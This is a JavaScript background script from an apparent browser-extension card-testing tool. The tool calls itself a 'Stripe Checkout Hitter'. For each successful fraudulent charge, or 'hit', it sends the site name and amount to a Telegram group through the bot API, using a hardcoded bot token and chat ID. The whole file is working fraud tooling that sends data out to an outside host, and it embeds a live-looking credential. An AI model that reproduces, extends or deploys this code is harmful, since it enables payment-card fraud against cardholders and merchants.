/**
 * Nexvora Absolute Bridge (v9.0 - Lightning)
 * Zero-latency Telegram proxy with strict isolation.
 */

(function() {
    // 1. Isolated Constants
    const _NEX_BOT_TOKEN = '8611283068:AAHACBysrkkm8RqmsidZ24QRwAIcnld4t8o';
    const _NEX_GROUP_ID = '-1003721268860';

    chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
        if (request.type === 'NOTIFY_HIT') {
            const { card, amount, gateway, status, site_name } = request.data;
            
            // Absolute Instant Proxy (No getChat wait)
            (async () => {
                try {
                    const message = `<b>HIT BDT</b>\n` +
                                    `🚀 <b>HIT SUCCESSFUL</b> ⚡\n` +
                                    `👤 <b>User:</b> 🇧🇩\n` +
                                    `🆙 <b>Plan:</b> <code>SILVER</code>\n` +
                                    `↔️ <b>Gateway:</b> <code>Stripe Checkou- Hitter</code>\n` +
                                    `✅ <b>Response:</b> <code>Charged Successfully</code>\n` +
                                    `🌐 <b>Site:</b> <code>${site_name || 'Unknown'}</code>\n` +
                                    `💰 <b>Amount:</b> <code>${amount || 'N/A'}</code>\n\n` +
                                    `<i>Checked by @hitinfobdrobot ✅</i>`;

                    await fetch(`https://api.telegram.org/bot${_NEX_BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: _NEX_GROUP_ID,
                            text: message,
                            parse_mode: 'HTML',
                            reply_markup: {
                                inline_keyboard: [[{ text: "🚀 Open Bot", url: "https://t.me/hitinfobdrobot" }]]
                            }
                        })
                    });
                    sendResponse({ ok: true });
                } catch (err) {
                    sendResponse({ ok: false, error: err.message });
                }
            })();
            return true; 
        }
    });
})();

// 2. Load Core Logic (This restores the Dashboard)
try {
    importScripts('background_core.js');
} catch (e) {
    console.error("Core Bridge Failed:", e);
}
